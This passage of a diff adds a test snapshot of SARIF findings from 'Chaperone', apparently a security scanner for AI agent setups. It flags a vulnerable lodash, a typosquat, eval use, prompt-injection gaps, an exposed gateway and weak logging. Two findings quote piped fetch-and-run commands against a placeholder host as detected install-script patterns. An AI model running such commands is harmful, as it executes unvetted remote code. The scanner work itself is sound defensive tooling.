+            "text": "Skill 'plugin-loader' depends on lodash@^4.17.15 (matched as 4.17.15), which hits 6 known vulnerabilities in Chaperone's offline snapshot (GHSA-29mw-wpgm-hmr9, GHSA-35jh-r3h4-6jhm, GHSA-f23m-r3pf-42rh, GHSA-p6mc-m468-83gw, GHSA-r5fr-rjxr-66jc, GHSA-xxjr-mmjv-4gpg) — most severe: \\"Command Injection in lodash\\" (high), fixed in 4.17.21."
+          },
+          "properties": {
+            "severity": "high",
+            "category": "supply-chain",
+            "owasp": "LLM05: Supply Chain",
+            "remediation": "Upgrade lodash to 4.17.21 or later."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/plugin-loader/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SUP-004",
+          "level": "warning",
+          "message": {
+            "text": "Skill 'shell-runner' install script contains a dangerous pattern (curl -fsSL https://example.invalid/setup.sh | bash) in package.json#scripts.postinstall."
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "supply-chain",
+            "owasp": "LLM05: Supply Chain",
+            "remediation": "Review the install script by hand; prefer a vetted, minimal setup with no piped-shell or sudo steps."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///Users/alpayaltuntas/Chaperone/package.json%23scripts.postinstall"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SUP-004",
+          "level": "warning",
+          "message": {
+            "text": "Skill 'shell-runner' install script contains a dangerous pattern (curl -fsSL https://example.invalid/bootstrap.sh | bash, sudo, apt-get install) in <TARGET_ROOT>/skills/shell-runner/install.sh."
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "supply-chain",
+            "owasp": "LLM05: Supply Chain",
+            "remediation": "Review the install script by hand; prefer a vetted, minimal setup with no piped-shell or sudo steps."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/shell-runner/install.sh"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SUP-005",
+          "level": "error",
+          "message": {
+            "text": "Skill 'plugin-loader' uses eval()/Function() to run dynamically-constructed code — a common way to hide a malicious payload from static review."
+          },
+          "properties": {
+            "severity": "critical",
+            "category": "supply-chain",
+            "owasp": "LLM05: Supply Chain",
+            "remediation": "Avoid dynamic code evaluation entirely; if truly needed, review the exact string being evaluated by hand and vendor/pin it rather than constructing it at runtime."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/plugin-loader/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SUP-006",
+          "level": "warning",
+          "message": {
+            "text": "Skill 'plugin-loader' depends on 'reqeust', which is suspiciously close to the well-known package 'request' — possible typosquat."
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "supply-chain",
+            "owasp": "LLM05: Supply Chain",
+            "remediation": "Double check that 'reqeust' is the package you actually intend to use, not a typosquat of 'request'."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/plugin-loader/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-INJ-001",
+          "level": "error",
+          "message": {
+            "text": "At least one inbound message channel is active, but config has no trust boundary marking untrusted content before it reaches the model."
+          },
+          "properties": {
+            "severity": "high",
+            "category": "injection",
+            "owasp": "LLM01: Prompt Injection",
+            "remediation": "Mark untrusted inbound content explicitly and keep it separated from system instructions in the prompt; filter before forwarding it to the model."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/config.yaml"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-INJ-002",
+          "level": "error",
+          "message": {
+            "text": "Skill 'command-relay' traces a network/filesystem result directly into a shell-exec call's argument — a confirmed tool-output-to-shell-execution chain, not just a shape-match."
+          },
+          "properties": {
+            "severity": "high",
+            "category": "injection",
+            "owasp": "LLM02: Insecure Output Handling",
+            "remediation": "Validate/escape a tool's output before it can drive another tool; never auto-execute model or tool output."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/command-relay/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-INJ-003",
+          "level": "error",
+          "message": {
+            "text": "At least one inbound message channel is active, but no channel/sender-to-tool allowlist restricts which tools an inbound message can invoke."
+          },
+          "properties": {
+            "severity": "high",
+            "category": "injection",
+            "owasp": "LLM01: Prompt Injection / LLM08: Excessive Agency",
+            "remediation": "Restrict which tools each channel/sender can invoke with an explicit allowlist."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/config.yaml"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-INJ-004",
+          "level": "error",
+          "message": {
+            "text": "Config auto-executes links/commands found in inbound messages with no confirmation step."
+          },
+          "properties": {
+            "severity": "high",
+            "category": "injection",
+            "owasp": "LLM01: Prompt Injection",
+            "remediation": "Disable auto-execution of links/commands found in messages; require explicit confirmation instead."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/config.yaml"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-NET-001",
+          "level": "error",
+          "message": {
+            "text": "The gateway is bound to '0.0.0.0', not localhost, making it reachable from other hosts on the network."
+          },
+          "properties": {
+            "severity": "critical",
+            "category": "network",
+            "owasp": "LLM06 / general",
+            "remediation": "Bind the gateway to 127.0.0.1/localhost; put anything that must be remote behind a tunnel with authentication."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/config.yaml"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-NET-002",
+          "level": "error",
+          "message": {
+            "text": "The gateway's control API has weak authentication: the auth token is empty or a common default value."
+          },
+          "properties": {
+            "severity": "high",
+            "category": "network",
+            "owasp": "General",
+            "remediation": "Require a strong, randomly-generated token for the gateway control API and rotate any default value."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/config.yaml"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-NET-003",
+          "level": "warning",
+          "message": {
+            "text": "The gateway is configured with TLS disabled, so traffic (including any auth token) travels in plaintext."
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "network",
+            "owasp": "General",
+            "remediation": "Enable TLS on the gateway and disable any plaintext fallback."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/config.yaml"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-OBS-001",
+          "level": "warning",
+          "message": {
+            "text": "Logging is configured but the audit log of tool invocations/actions is disabled."
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "observability",
+            "owasp": "LLM08-adjacent",
+            "remediation": "Enable an append-only audit log of every tool invocation/action the agent takes."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/config.yaml"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-OBS-002",
+          "level": "warning",
+          "message": {
+            "text": "Logging config does not confirm secrets/message bodies are redacted before being written to logs."
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "observability",
+            "owasp": "LLM06: Sensitive Information Disclosure",
+            "remediation": "Redact secrets and sensitive message content before logging, and restrict access to the log file."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/logs/agent.log"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-OBS-003",
+          "level": "note",
+          "message": {
+            "text": "No documented quick way to stop the agent and revoke its access was found at the install root."
+          },
+          "properties": {
+            "severity": "low",
+            "category": "observability",
+            "owasp": "General",
+            "remediation": "Document a kill switch (how to stop the agent) and a script or checklist to revoke/rotate its credentials."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-OBS-004",
+          "level": "warning",
+          "message": {
+            "text": "The persistent memory/state store is exposed: it is readable by group or other (mode 755); it sits inside a git repository (<TARGET_ROOT>) without being covered by its .gitignore."
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "observability",
+            "owasp": "LLM06: Sensitive Information Disclosure",
+            "remediation": "Restrict the memory/state directory to owner-only access (chmod 700) and add it to .gitignore — it can accumulate sensitive conversational content over time."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/memory"
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}"
+`;
